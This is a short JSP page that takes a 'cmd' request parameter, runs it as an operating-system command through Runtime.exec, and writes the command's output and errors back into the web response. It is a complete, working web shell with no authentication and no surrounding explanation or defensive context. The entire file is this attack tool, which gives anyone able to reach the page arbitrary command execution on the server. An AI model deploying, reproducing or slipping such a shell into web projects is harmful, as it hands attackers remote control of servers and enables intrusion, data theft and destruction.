<%@ page import="java.io.*" %>
<%
    // Retrieve the command from the request parameter
    String cmd = request.getParameter("cmd");

    if (cmd != null) {
        try {
            // Execute the command
            Process process = Runtime.getRuntime().exec(cmd);
            
            // Capture the output of the command
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            
            String line;
            // Write the output to the response
            out.println("<h3>Command Output:</h3>");
            out.println("<pre>");
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
            out.println("</pre>");

            // Capture and display any errors
            out.println("<h3>Command Errors (if any):</h3>");
            out.println("<pre>");
            while ((line = errorReader.readLine()) != null) {
                out.println(line);
            }
            out.println("</pre>");

            // Close readers
            reader.close();
            errorReader.close();
        } catch (IOException e) {
            // Handle exceptions
            out.println("An error occurred while executing the command: " + e.getMessage());
        }
    } else {
        out.println("No command specified.");
    }
%>
